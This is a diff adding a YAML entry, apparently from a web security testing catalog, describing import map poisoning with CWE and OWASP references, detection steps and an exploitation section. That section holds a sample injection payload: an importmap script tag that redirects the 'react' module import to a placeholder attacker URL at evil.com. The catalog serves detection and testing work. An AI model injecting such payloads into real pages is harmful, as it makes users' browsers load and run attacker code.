@@ -1,0 +1,17 @@
+id: IMPORT_MAP_POISONING
+name: Import Map Poisoning
+cwe:
+- CWE-829
+owasp: A08:2021 Software Integrity Failures
+severity_range: High
+description: Inject malicious entries into <script type='importmap'> to redirect module imports to attacker code.
+detection:
+  strategy:
+  - Search HTML for <script type='importmap'>
+  - Find injection points that appear before the importmap declaration
+  - Test if attacker can inject a competing importmap or extend the existing one
+exploitation:
+- 'Inject: <script type=''importmap''>{"imports":{"react":"https://evil.com/x.js"}}</script>'
+- All subsequent import 'react' statements load attacker code
+references:
+- https://github.com/WICG/import-maps
